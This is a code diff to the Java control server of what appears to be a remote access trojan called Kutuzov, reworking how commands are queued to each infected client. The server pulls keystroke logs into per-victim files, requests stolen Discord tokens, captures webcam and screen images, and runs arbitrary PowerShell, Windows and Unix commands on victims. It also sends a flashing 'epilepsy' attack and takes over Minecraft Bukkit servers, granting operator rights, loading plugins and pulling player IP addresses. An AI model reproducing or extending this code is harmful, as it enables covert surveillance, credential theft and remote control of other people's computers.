@@ -12,6 +12,7 @@ import me.kutuzov.packet.logger.types.TokenType;
 import me.kutuzov.server.client.Client;
 import me.kutuzov.server.client.ClientManager;
 import me.kutuzov.server.kftp.KFTPPanel;
+import me.kutuzov.server.util.ActionQueue;
 import me.kutuzov.server.util.LoadingWheel;
 import me.kutuzov.utils.ImageUtils;
 import me.pk2.moodlyencryption.MoodlyEncryption;
@@ -31,12 +32,14 @@ import java.util.Date;
 import java.util.Locale;
 import java.util.Map;
 import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.atomic.AtomicReference;
 
 import static me.kutuzov.server.KutuzovEnvironment.*;
 import static me.kutuzov.server.util.ConsoleUtils.*;
 
 public class KutuzovServer {
     public final ClientManager clientManager;
+    public final ActionQueue actionQueue;
     private final LoadingWheel loadingWheel;
     private ServerSocket serverSocket;
     private Thread thread, checkThreadLoop, writerLoop;
@@ -44,6 +47,7 @@ public class KutuzovServer {
     public KutuzovServer() {
         this.loadingWheel = new LoadingWheel();
         this.clientManager = new ClientManager();
+        this.actionQueue = new ActionQueue();
     }
 
     public void boot() {
@@ -93,42 +97,43 @@ public class KutuzovServer {
         }
 
         thread = new Thread(() -> {
-            while(true) {
+            //while(true) {
                 Socket clientSocket;
                 try {
                     clientSocket = serverSocket.accept();
                 } catch (IOException exception) {
                     exception.printStackTrace();
-                    continue;
+                    return;
                 }
 
-                Client client = clientManager.newClient(clientSocket);
-                try {
-                    client.sendPacket(new SCRequireHandshakePacket());
-                    CSHandshakePacket handshakePacket = (CSHandshakePacket)client.readPacket();
-                    client.setIdentifierName(handshakePacket.identifierName);
-                    client.setOs(handshakePacket.os);
-                    client.setLocalIp(handshakePacket.localIp);
-                    client.setVersion(handshakePacket.version);
-                    client.setMC(handshakePacket.isMC);
-                } catch (IOException e) {
-                    pnl("Could not request handshake from client(" + client.getIp() + ")!");
-                }
-            }
-        });
+                    Client client = clientManager.newClient(clientSocket);
+                    try {
+                        client.sendPacket(new SCRequireHandshakePacket());
+                        CSHandshakePacket handshakePacket = (CSHandshakePacket)client.readPacket();
+                        client.setIdentifierName(handshakePacket.identifierName);
+                        client.setOs(handshakePacket.os);
+                        client.setLocalIp(handshakePacket.localIp);
+                        client.setVersion(handshakePacket.version);
+                        client.setMC(handshakePacket.isMC);
+                    } catch (IOException e) {
+                        pnl("Could not request handshake from client(" + client.getIp() + ")!");
+                    }
+                });
+            //}
         thread.start();
 
         checkThreadLoop = new Thread(() -> {
             while(true) {
                 trySleep(5000);
                 for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
-                    asyncRun(() -> {
+                    asyncRun(() -> entry.getValue().add(() -> {
                         try {
                             entry.getValue().sendPacket(new SCKeepAlivePacket());
                         } catch (Exception e) {
                             clientManager.clients.remove(entry.getKey());
                             // pnl("Client disconnected(" + clientManager.clients.size() + "): " + entry.getKey());
-                        }});
+                        }
+                    }));
             }
         });
         checkThreadLoop.start();
@@ -143,24 +148,27 @@ public class KutuzovServer {
                 String date = LocalDateTime.now().format(formatter);
                 for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                     asyncRun(() -> {
-                        if(!entry.getValue().getVersion().contentEquals(VERSION))
-                            return;
-
-                        try {
-                            if(!entry.getValue().getConnection().isConnected())
+                        entry.getValue().add(() -> {
+                            if(!entry.getValue().getVersion().contentEquals(VERSION))
                                 return;
-                            entry.getValue().sendPacket(new SCAskWriterPacket());
-                            CSWriterPacket wPacket = (CSWriterPacket)entry.getValue().readPacket();
 
-                            File file = new File("keylog/" + entry.getValue().getIdentifierName() + "/" + entry.getValue().getIp().split(":")[0] + "_" + entry.getValue().getLocalIp() + "/" + date + ".log");
-                            file.getParentFile().mkdirs();
-                            if(!file.exists())
-                                file.createNewFile();
+                            try {
+                                if(!entry.getValue().getConnection().isConnected())
+                                    return;
+                                entry.getValue().sendPacket(new SCAskWriterPacket());
+                                CSWriterPacket wPacket = (CSWriterPacket)entry.getValue().readPacket();
 
-                            FileOutputStream writer = new FileOutputStream(file.getPath(), true);
-                            writer.write((wPacket.text + "\r\n").getBytes(StandardCharsets.UTF_8));
-                            writer.close();
-                        } catch (Exception e) {}});
+                                File file = new File("keylog/" + entry.getValue().getIdentifierName() + "/" + entry.getValue().getIp().split(":")[0] + "_" + entry.getValue().getLocalIp() + "/" + date + ".log");
+                                file.getParentFile().mkdirs();
+                                if(!file.exists())
+                                    file.createNewFile();
+
+                                FileOutputStream writer = new FileOutputStream(file.getPath(), true);
+                                writer.write((wPacket.text + "\r\n").getBytes(StandardCharsets.UTF_8));
+                                writer.close();
+                            } catch (Exception e) {}
+                        });
+                    });
             }
         });
         writerLoop.start();
@@ -176,23 +184,25 @@ public class KutuzovServer {
     }
 
     private void packet_csda_send(String data, Client client) {
-        try {
-            client.sendPacket(new SCDAPacket(data));
+        client.add(() -> {
+            try {
+                client.sendPacket(new SCDAPacket(data));
 
-            CSDAResPacket resPacket = (CSDAResPacket) client.readPacket();
+                CSDAResPacket resPacket = (CSDAResPacket) client.readPacket();
 
-            switch (resPacket.response) {
-                case CSDAResPacket.RESPONSE_OK:
-                    pnl("Sent to " + client.getFormattedIdentifierName());
-                    break;
-                case CSDAResPacket.RESPONSE_ERROR:
-                    pnl("Error sending to " + client.getFormattedIdentifierName());
-                    break;
-                case CSDAResPacket.RESPONSE_BUSY:
-                    pnl(client.getFormattedIdentifierName() + " is busy!");
-                    break;
-            }
-        } catch (Exception e) { pnl("Failed to send data to " + client.getFormattedIdentifierName() + "! (" + e.getMessage() + ")"); }
+                switch (resPacket.response) {
+                    case CSDAResPacket.RESPONSE_OK:
+                        pnl("Sent to " + client.getFormattedIdentifierName());
+                        break;
+                    case CSDAResPacket.RESPONSE_ERROR:
+                        pnl("Error sending to " + client.getFormattedIdentifierName());
+                        break;
+                    case CSDAResPacket.RESPONSE_BUSY:
+                        pnl(client.getFormattedIdentifierName() + " is busy!");
+                        break;
+                }
+            } catch (Exception e) { pnl("Failed to send data to " + client.getFormattedIdentifierName() + "! (" + e.getMessage() + ")"); }
+        });
     }
 
     private void packet_csda(String data, Client client) {
@@ -346,98 +356,112 @@ public class KutuzovServer {
 
         switch (option) {
             case 1: {
-                try {
-                    client.sendPacket(new SCTokenRequest(TokenType.DISCORD));
-                } catch(Exception exception) {
-                    exception.printStackTrace();
-                    pnl("Could not send SCTokenRequest packet with type DISCORD.");
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCTokenRequest(TokenType.DISCORD));
+                    } catch(Exception exception) {
+                        exception.printStackTrace();
+                        pnl("Could not send SCTokenRequest packet with type DISCORD.");
+                        return;
+                    }
 
-                    trySleep(5000);
-                    break;
-                }
+                    CSTokenResponse response = (CSTokenResponse) client.readPacket();
+                    if(response.type != TokenType.DISCORD)
+                        pnl("WARNING! The received token is not a DISCORD token, is a " + response.type.name() + " token!");
 
-                CSTokenResponse response = (CSTokenResponse) client.readPacket();
-                if(response.type != TokenType.DISCORD)
-                    pnl("WARNING! The received token is not a DISCORD token, is a " + response.type.name() + " token!");
+                    pnl("Received token(s)<" + response.tokens.length + ">:");
+                    for(int i = 0; i < response.tokens.length; i++)
+                        pnl("  - " + response.tokens[i]);
+                });
 
-                pnl("Received token(s)<" + response.tokens.length + ">:");
-                for(int i = 0; i < response.tokens.length; i++)
-                    pnl("  - " + response.tokens[i]);
                 pnl("Press any key to continue.");
                 readLine();
             } break;
 
             case 2: {
-                try {
-                    client.sendPacket(new SCWebcamList());
-                } catch (Exception e) {
-                    e.printStackTrace();
-                    pnl("Could not send SCWebcamList packet.");
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCWebcamList());
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                        pnl("Could not send SCWebcamList packet.");
 
-                    trySleep(5000);
-                }
+                        trySleep(5000);
+                    }
+                });
 
                 pnl("Waiting for CSWebcamList...");
 
-                CSWebcamList list = (CSWebcamList) client.readPacket();
-                pnl("Received webcam list with " + list.webcamNames.length + " webcams.");
+                AtomicReference<CSWebcamList> list = new AtomicReference<>();
+                client.addWait(() -> {
+                    list.set((CSWebcamList) client.readPacket());
+                });
+
+                pnl("Received webcam list with " + list.get().webcamNames.length + " webcams.");
                 pnl("Please select a webcam: ");
-                for(int i = 0; i < list.webcamNames.length; i++)
-                    pnl("  " + i + ") " + list.webcamNames[i]);
+                for(int i = 0; i < list.get().webcamNames.length; i++)
+                    pnl("  " + i + ") " + list.get().webcamNames[i]);
 
                 pwl("Webcam: ");
                 int webcam = Integer.parseInt(readLine());
-                pnl("Selected webcam: " + list.webcamNames[webcam]);
+                pnl("Selected webcam: " + list.get().webcamNames[webcam]);
 
-                try {
-                    client.sendPacket(new SCWebcamFrame(webcam));
-                } catch (Exception e) {
-                    e.printStackTrace();
-                    pnl("Could not send SCWebcamFrame packet.");
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCWebcamFrame(webcam));
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                        pnl("Could not send SCWebcamFrame packet.");
 
-                    trySleep(5000);
-                }
+                        return;
+                    }
 
-                pnl("Waiting for CSWebcamFrame...");
+                    pnl("Waiting for CSWebcamFrame...");
 
-                CSWebcamFrame frame = (CSWebcamFrame) client.readPacket();
-                pnl("Received frame with size " + frame.bytes.length + " bytes.");
-                pnl("Converting to image...");
+                    CSWebcamFrame frame = (CSWebcamFrame) client.readPacket();
+                    pnl("Received frame with size " + frame.bytes.length + " bytes.");
+                    pnl("Converting to image...");
 
-                try {
-                    BufferedImage image = ImageUtils.toBufferedImage(frame.bytes);
-                    ImageIO.write(image, "png", file);
+                    try {
+                        BufferedImage image = ImageUtils.toBufferedImage(frame.bytes);
+                        ImageIO.write(image, "png", file);
 
-                    pnl("Image saved to \"" + file.getAbsolutePath() + "\".");
-                } catch (IOException e) {
-                    e.printStackTrace();
-                    pnl("Could not convert frame to image.");
+                        pnl("Image saved to \"" + file.getAbsolutePath() + "\".");
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                        pnl("Could not convert frame to image.");
 
-                    trySleep(5000);
-                }
+                        return;
+                    }
+                });
 
                 pnl("Press any key to continue.");
                 readLine();
             } break;
 
             case 3: {
-                try {
-                    client.sendPacket(new SCScreenFrame());
-                } catch (Exception e) {
-                    e.printStackTrace();
-                    pnl("Could not send SCScreenFrame packet.");
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCScreenFrame());
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                        pnl("Could not send SCScreenFrame packet.");
 
-                    trySleep(5000);
-                }
+                        trySleep(5000);
+                    }
+                });
 
                 pnl("Waiting for CSScreenFrame...");
 
-                CSScreenFrame frame = (CSScreenFrame) client.readPacket();
-                pnl("Received frame with size " + frame.data.length + " bytes.");
+                AtomicReference<CSScreenFrame> frame = new AtomicReference<>();
+                client.addWait(() -> {
+                    frame.set((CSScreenFrame) client.readPacket());
+                });
+                pnl("Received frame with size " + frame.get().data.length + " bytes.");
                 pnl("Converting to image...");
 
                 try {
-                    BufferedImage image = ImageUtils.toBufferedImage(frame.data);
+                    BufferedImage image = ImageUtils.toBufferedImage(frame.get().data);
                     ImageIO.write(image, "png", file);
 
                     pnl("Image saved to \"" + file.getAbsolutePath() + "\".");
@@ -485,71 +509,75 @@ public class KutuzovServer {
                 pnl("Please enter the amount of time(ms):");
                 pwl("Time(ms): ");
                 int time = Integer.parseInt(readLine());
-                try {
-                    client.sendPacket(new SCEpilepsyPacket(time));
-                } catch (IOException exception) {
-                    pnl("Failed to send epilepsy to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
-                    readLine();
-                }
+                client.add(() -> {
+                    try {
+                        client.sendPacket(new SCEpilepsyPacket(time));
+                    } catch (IOException exception) {
+                        pnl("Failed to send epilepsy to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                        readLine();
+                    }
+                });
             } break;
 
             case 2: {
                 clearConsole();
                 pwl("Command: ");
                 String command = readLine();
-                try {
-                    client.sendPacket(new SCPowershellCommandPacket(command));
-                    Packet packet = null;
-                    while(packet == null || !(packet instanceof CSPowershellResponsePacket)) {
-                        try {
-                            packet = (Packet) client.readPacket();
-                        } catch (Exception exception) {
-                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
-                            readLine();
-                            break;
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCPowershellCommandPacket(command));
+                        Packet packet = null;
+                        while(packet == null || !(packet instanceof CSPowershellResponsePacket)) {
+                            try {
+                                packet = (Packet) client.readPacket();
+                            } catch (Exception exception) {
+                                pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                                return;
+                            }
                         }
-                    }
 
-                    if(packet == null)
-                        return;
-                    CSPowershellResponsePacket responsePacket = (CSPowershellResponsePacket)packet;
-                    String response = responsePacket.response;
-                    pnl("Response: \n  " + response);
-                    readLine();
-                } catch (IOException exception) {
-                    pnl("Failed to send powershell command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
-                    exception.printStackTrace();
-                    readLine();
-                }
+                        if(packet == null)
+                            return;
+                        CSPowershellResponsePacket responsePacket = (CSPowershellResponsePacket)packet;
+                        String response = responsePacket.response;
+                        pnl("Response: \n  " + response);
+                    } catch (IOException exception) {
+                        pnl("Failed to send powershell command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                        exception.printStackTrace();
+                    }
+                });
+
+                readLine();
             } break;
 
             case 3: {
                 clearConsole();
                 pwl("Command: ");
                 String command = readLine();
-                try {
-                    client.sendPacket(new SCWinCommandPacket(command));
-                    Packet packet = null;
-                    while(packet == null || !(packet instanceof CSWinCommandResponsePacket)) {
-                        try {
-                            packet = (Packet) client.readPacket();
-                        } catch (Exception exception) {
-                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
-                            readLine();
-                            break;
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCWinCommandPacket(command));
+                        Packet packet = null;
+                        while(packet == null || !(packet instanceof CSWinCommandResponsePacket)) {
+                            try {
+                                packet = (Packet) client.readPacket();
+                            } catch (Exception exception) {
+                                pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                                return;
+                            }
                         }
-                    }
 
-                    if(packet == null)
-                        return;
-                    CSWinCommandResponsePacket responsePacket = (CSWinCommandResponsePacket)packet;
-                    String response = responsePacket.response;
-                    pnl("Response: \n  " + response);
-                    readLine();
-                } catch (IOException exception) {
-                    pnl("Failed to send windows command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
-                    readLine();
-                }
+                        if(packet == null)
+                            return;
+                        CSWinCommandResponsePacket responsePacket = (CSWinCommandResponsePacket)packet;
+                        String response = responsePacket.response;
+                        pnl("Response: \n  " + response);
+                    } catch (IOException exception) {
+                        pnl("Failed to send windows command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                    }
+                });
+
+                readLine();
             } break;
 
             case 0:
@@ -573,29 +601,30 @@ public class KutuzovServer {
                 clearConsole();
                 pwl("Command: ");
                 String command = readLine();
-                try {
-                    client.sendPacket(new SCUnixCommandPacket(command));
-                    Packet packet = null;
-                    while(packet == null || !(packet instanceof CSWinCommandResponsePacket)) {
-                        try {
-                            packet = (Packet) client.readPacket();
-                        } catch (Exception exception) {
-                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
-                            readLine();
-                            break;
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCUnixCommandPacket(command));
+                        Packet packet = null;
+                        while(packet == null || !(packet instanceof CSWinCommandResponsePacket)) {
+                            try {
+                                packet = (Packet) client.readPacket();
+                            } catch (Exception exception) {
+                                pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                                return;
+                            }
                         }
-                    }
 
-                    if(packet == null)
-                        return;
-                    CSUnixCommandResponsePacket responsePacket = (CSUnixCommandResponsePacket)packet;
-                    String response = responsePacket.response;
-                    pnl("Response: \n  " + response);
-                    readLine();
-                } catch (Exception exception) {
-                    pnl("Failed to send windows command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
-                    readLine();
-                }
+                        if(packet == null)
+                            return;
+                        CSUnixCommandResponsePacket responsePacket = (CSUnixCommandResponsePacket)packet;
+                        String response = responsePacket.response;
+                        pnl("Response: \n  " + response);
+                    } catch (Exception exception) {
+                        pnl("Failed to send windows command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                    }
+                });
+
+                readLine();
             } break;
 
             case 0:
@@ -607,29 +636,30 @@ public class KutuzovServer {
     private void user_list_client_bukkit(Client client) {
         clearConsole();
 
-        CSBukkitInfo info = null;
-        try {
-            client.sendPacket(new SCBukkitInfo());
-            Packet packet = null;
-            while(!(packet instanceof CSBukkitInfo)) {
-                try {
-                    packet = (Packet) client.readPacket();
-                } catch (Exception exception) {
-                    pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
-                    readLine();
-                    return;
+        AtomicReference<CSBukkitInfo> info = new AtomicReference<>();
+        client.addWait(() -> {
+            try {
+                client.sendPacket(new SCBukkitInfo());
+                Packet packet = null;
+                while(!(packet instanceof CSBukkitInfo)) {
+                    try {
+                        packet = (Packet) client.readPacket();
+                    } catch (Exception exception) {
+                        pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                        return;
+                    }
                 }
-            }
 
-            info = (CSBukkitInfo)packet;
-        }catch (IOException exception) {
-            exception.printStackTrace();
-            return;
-        }
+                info.set((CSBukkitInfo)packet);
+            }catch (IOException exception) {
+                exception.printStackTrace();
+                return;
+            }
+        });
 
         user_list_header(client);
-        pnl("Bukkit Version: " + info.VERSION);
-        pnl("Bukkit Port: " + info.PORT);
+        pnl("Bukkit Version: " + info.get().VERSION);
+        pnl("Bukkit Port: " + info.get().PORT);
         pnl("Options: ");
         pnl("  0) Go back");
         pnl("  1) Send console command");
@@ -653,13 +683,16 @@ public class KutuzovServer {
 
                 String command = readLine();
 
-                try {
-                    client.sendPacket(new SCBukkitCommand(command));
-                    pnl("Command sent!");
-                    break;
-                } catch (IOException exception) {
-                    exception.printStackTrace();
-                }
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCBukkitCommand(command));
+                        pnl("Command sent!");
+                    } catch (IOException exception) {
+                        exception.printStackTrace();
+                    }
+                });
+
+                readLine();
             } break;
 
             case 2: {
@@ -674,13 +707,16 @@ public class KutuzovServer {
 
                 String command = readLine();
 
-                try {
-                    client.sendPacket(new SCBukkitPlayerCommand(player, command));
-                    pnl("Command sent!");
-                    break;
-                } catch (IOException exception) {
-                    exception.printStackTrace();
-                }
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCBukkitPlayerCommand(player, command));
+                        pnl("Command sent!");
+                    } catch (IOException exception) {
+                        exception.printStackTrace();
+                    }
+                });
+
+                readLine();
             } break;
 
             case 3: {
@@ -695,13 +731,16 @@ public class KutuzovServer {
 
                 String message = readLine();
 
-                try {
-                    client.sendPacket(new SCBukkitPlayerChat(player, message));
-                    pnl("Message sent!");
-                    break;
-                } catch (IOException exception) {
-                    exception.printStackTrace();
-                }
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCBukkitPlayerChat(player, message));
+                        pnl("Message sent!");
+                    } catch (IOException exception) {
+                        exception.printStackTrace();
+                    }
+                });
+
+                readLine();
             } break;
 
             case 4: {
@@ -711,9 +750,14 @@ public class KutuzovServer {
 
                 String player = readLine();
 
-                try {
-                    client.sendPacket(new SCBukkitOperator(player));
-                } catch (IOException exception) { exception.printStackTrace(); }
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCBukkitOperator(player));
+                        pnl("Player is now OP!");
+                    } catch (IOException exception) { exception.printStackTrace(); }
+                });
+
+                readLine();
             } break;
 
             case 5: {
@@ -728,9 +772,14 @@ public class KutuzovServer {
 
                 int gamemode = Integer.parseInt(readLine());
 
-                try {
-                    client.sendPacket(new SCBukkitGamemode(player, gamemode));
-                } catch (IOException exception) { exception.printStackTrace(); }
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCBukkitGamemode(player, gamemode));
+                        pnl("Player's gamemode has been changed!");
+                    } catch (IOException exception) { exception.printStackTrace(); }
+                });
+
+                readLine();
             } break;
 
             case 6: {
@@ -740,54 +789,57 @@ public class KutuzovServer {
 
                 String player = readLine();
 
-                try {
-                    client.sendPacket(new SCBukkitPlayerAddress(player));
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCBukkitPlayerAddress(player));
 
-                    Packet packet = null;
-                    while(!(packet instanceof CSBukkitPlayerAddress)) {
-                        try {
-                            packet = (Packet) client.readPacket();
-                        } catch (Exception exception) {
-                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
-                            readLine();
-                            return;
+                        Packet packet = null;
+                        while(!(packet instanceof CSBukkitPlayerAddress)) {
+                            try {
+                                packet = (Packet) client.readPacket();
+                            } catch (Exception exception) {
+                                pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                                return;
+                            }
                         }
-                    }
 
-                    CSBukkitPlayerAddress bukkitPlayerAddress = (CSBukkitPlayerAddress)packet;
-                    pnl(player + "'s address is: " + bukkitPlayerAddress.address);
-                    readLine();
-                    break;
-                } catch (IOException exception) {
-                    exception.printStackTrace();
-                }
+                        CSBukkitPlayerAddress bukkitPlayerAddress = (CSBukkitPlayerAddress)packet;
+                        pnl(player + "'s address is: " + bukkitPlayerAddress.address);
+                    } catch (IOException exception) {
+                        exception.printStackTrace();
+                    }
+                });
+
+                readLine();
             } break;
 
             case 7: {
                 clearConsole();
                 pnl("Obtaining plugin list...");
 
-                try {
-                    client.sendPacket(new SCBukkitPluginList());
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCBukkitPluginList());
 
-                    Packet packet = null;
-                    while(!(packet instanceof CSBukkitPluginList)) {
-                        try {
-                            packet = (Packet)client.readPacket();
-                        } catch (Exception exception) {
-                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
-                            readLine();
-                            return;
+                        Packet packet = null;
+                        while(!(packet instanceof CSBukkitPluginList)) {
+                            try {
+                                packet = (Packet)client.readPacket();
+                            } catch (Exception exception) {
+                                pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                                return;
+                            }
                         }
-                    }
 
-                    CSBukkitPluginList pluginList = (CSBukkitPluginList)packet;
-                    String pluginString = String.join(", ", pluginList.plugins);
-                    pnl("Plugins: " + pluginString);
-                    readLine();
-                } catch (IOException exception) {
-                    exception.printStackTrace();
-                }
+                        CSBukkitPluginList pluginList = (CSBukkitPluginList)packet;
+                        String pluginString = String.join(", ", pluginList.plugins);
+                        pnl("Plugins: " + pluginString);
+                    } catch (IOException exception) {
+                        exception.printStackTrace();
+                    }
+                });
+
+                readLine();
             } break;
 
             case 8: {
@@ -797,11 +849,16 @@ public class KutuzovServer {
                 pwl("File: ");
                 String file = readLine();
 
-                try {
-                    client.sendPacket(new SCBukkitLoadPlugin(file));
-                } catch (IOException exception) {
-                    exception.printStackTrace();
-                }
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCBukkitLoadPlugin(file));
+                        pnl("Plugin loaded!");
+                    } catch (IOException exception) {
+                        exception.printStackTrace();
+                    }
+                });
+
+                readLine();
             } break;
 
             case 9: {
@@ -811,11 +868,16 @@ public class KutuzovServer {
                 pwl("Plugin: ");
                 String plugin = readLine();
 
-                try {
-                    client.sendPacket(new SCBukkitEnablePlugin(plugin));
-                } catch (IOException exception) {
-                    exception.printStackTrace();
-                }
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCBukkitEnablePlugin(plugin));
+                        pnl("Plugin enabled!");
+                    } catch (IOException exception) {
+                        exception.printStackTrace();
+                    }
+                });
+
+                readLine();
             } break;
 
             case 10: {
@@ -825,11 +887,16 @@ public class KutuzovServer {
                 pwl("Plugin: ");
                 String plugin = readLine();
 
-                try {
-                    client.sendPacket(new SCBukkitDisablePlugin(plugin));
-                } catch (IOException exception) {
-                    exception.printStackTrace();
-                }
+                client.addWait(() -> {
+                    try {
+                        client.sendPacket(new SCBukkitDisablePlugin(plugin));
+                        pnl("Plugin disabled!");
+                    } catch (IOException exception) {
+                        exception.printStackTrace();
+                    }
+                });
+
+                readLine();
             } break;
 
             case 0:
@@ -894,12 +961,13 @@ public class KutuzovServer {
                 break;
 
             case 5: {
-                try {
-                    client.sendPacket(new SCBeepPacket());
-                } catch (IOException exception) {
-                    pnl("Failed to send beep to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
-                    readLine();
-                }
+                client.add(() -> {
+                    try {
+                        client.sendPacket(new SCBeepPacket());
+                    } catch (IOException exception) {
+                        pnl("Failed to send beep to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                    }
+                });
             } break;
 
             case 6:
@@ -944,7 +1012,6 @@ public class KutuzovServer {
     }
 
 
-
     private void menu() {
         clearConsole();
         pnl("Connected clients: " + clientManager.clients.size());
@@ -977,9 +1044,11 @@ public class KutuzovServer {
 
                 for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                     asyncRun(() -> {
-                        try {
-                            entry.getValue().sendPacket(new SCMessageBoxPacket(title, content, amount));
-                        } catch (Exception e) { e.printStackTrace(); }});
+                        entry.getValue().add(() -> {
+                            try {
+                                entry.getValue().sendPacket(new SCMessageBoxPacket(title, content, amount));
+                            } catch (Exception e) { e.printStackTrace(); }});
+                        });
                 menu();
                 break;
             case 2:
@@ -993,9 +1062,11 @@ public class KutuzovServer {
             case 4:
                 for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                     asyncRun(() -> {
-                        try {
-                            entry.getValue().sendPacket(new SCBeepPacket());
-                        } catch (Exception e) { e.printStackTrace(); }});
+                        entry.getValue().add(() -> {
+                            try {
+                                entry.getValue().sendPacket(new SCBeepPacket());
+                            } catch (Exception e) { e.printStackTrace(); }});
+                        });
                 menu();
                 break;
 
